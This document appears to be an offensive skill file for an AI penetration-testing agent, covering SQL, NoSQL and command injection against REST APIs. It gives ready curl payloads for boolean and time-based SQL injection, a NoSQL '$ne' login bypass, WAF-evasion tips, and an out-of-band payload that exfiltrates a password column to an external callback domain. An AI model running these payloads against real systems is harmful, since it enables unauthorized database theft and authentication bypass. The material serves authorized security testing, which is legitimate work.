---
name: api-injection
description: API injection testing — SQL and NoSQL operator injection through JSON bodies, query params, sort/filter fields, and headers, with boolean, time-based, error-based, and OOB confirmation
intent: offensive
protocol: rest
---

# API Injection Testing

## Purpose
Exploit injection sinks behind API endpoints: SQL injection in JSON-body values, ORDER BY/filter fields, and headers; NoSQL operator injection; command injection reaching OS shells. Confirmed via differential, timing, error, or out-of-band evidence — never via status codes alone.

SSRF through URL-accepting parameters belongs to api-ssrf.

## Preconditions
- Mapped API surface with input-bearing endpoints
- For blind cases: an OOB callback domain (oob_callback tool)
- Backend fingerprint from reconnaissance (DB type determines dialect payloads)

## Attack Surface Signals
- String fields in JSON bodies, query strings, path segments
- Sort/order/filter/fields parameters (ORDER BY injection)
- Headers that reach storage or queries: X-Forwarded-For, User-Agent, Referer, cookies
- Search endpoints, report/export builders, document lookups

## Methodology

### Step 1: Map Injection Points
Enumerate every string input: path, query, JSON body (all keys, nested), headers, cookies. Include fields others skip: sort, order, filter, fields, page, locale, timezone.

### Step 2: SQL Injection
```bash
# Baseline first — record normal response and timing
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/products?category=electronics" > tmp/base.json
# Boolean differential
curl -sk "https://TARGET/api/products?category=electronics'--" > tmp/t1.json
curl -sk "https://TARGET/api/products?category=electronics' OR '1'='1'--" > tmp/t2.json
diff <(jq -S . tmp/base.json) <(jq -S . tmp/t2.json)
# ORDER BY / sort-field injection (no quotes needed)
curl -sk "https://TARGET/api/products?sort=price;SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
```
Dialects: MySQL (`SLEEP(5)`, `--`), PostgreSQL (`pg_sleep(5)`, `--`), MSSQL (`WAITFOR DELAY '0:0:5'`, `;--`), SQLite, Oracle (`dbms_pipe.receive_message`). Try all before concluding negative when errors are suppressed.

### Step 3: NoSQL Operator Injection
```bash
# Operator injection via query string (URL-encoded) — reaches Mongo-style parsers
curl -sk "https://TARGET/api/users?username%5B%24ne%5D=x&password%5B%24ne%5D=x"
# JSON body variants
curl -sk -X POST "https://TARGET/api/auth/login" -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'
# $regex / $where / $gt families
```

### Step 4: Header and Second-Order Sinks
- Inject into X-Forwarded-For/UA/Referer when they are logged, rendered, or queried
- Second-order: payload stored on create (e.g., `POST /users` name field) that executes when an admin/report/search view processes it — test the full lifecycle

### Step 5: OOB and Time-Based Confirmation
```bash
# Blind: OOB exfiltration to the callback domain
curl -sk "https://TARGET/api/search?q=test'||(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password),'OOB.oast.pro\\s')))--"
# Time-based: compare SLEEP payload timing against a no-op baseline, repeated 3+ times
```

## Evidence Contract
An injection finding requires ALL of:
1. Baseline: normal request behavior recorded
2. Manipulation: payload placed in the target sink
3. Differential: data extracted (boolean/error/union), reproducible timing delay absent from baseline, or an OOB callback from the target's backend
4. Attribution: the effect must vanish when the payload is neutralized

**NOT evidence**: a 500 error alone, a missing error, SQL-ish error strings without data extraction, single-sample timing

## Common Misses
- JSON-body values and sort/filter fields never tested (only query strings)
- Header sinks skipped because body params looked sanitized
- URL-encoded operator syntax (`username[$ne]`) not tried against NoSQL backends
- Second-order payloads never followed through the lifecycle
- WAF blocks: try encoding (double-URL, unicode, comment splitting) before concluding blocked

## False Positives / Non-Findings
- Application errors that mention SQL but reject every extraction payload
- Generic 500s from invalid input (not injection)
- Time jitter without a payload-correlated pattern
- OOB callbacks from client-side resolution rather than the server

## Xalgorix Tool Strategy
- `http_request`/curl for exact payload control; Python for dialect and encoding matrices
- `oob_callback` for blind confirmation
- sqlmap where a confirmed injection needs deep extraction; ffuf for parameter discovery

## Stopping Rule
Every string sink x every backend dialect x boolean/time/error/OOB confirmation, until extraction or a neutralized control proves the input is safe.

## Handoff
Report sink location, payload class, confirmation method (extracted data, timing delta with baseline, OOB interaction ID), and backend dialect. URL-fetch sinks go to api-ssrf; XML parsing sinks to soap-api-security/XXE skills.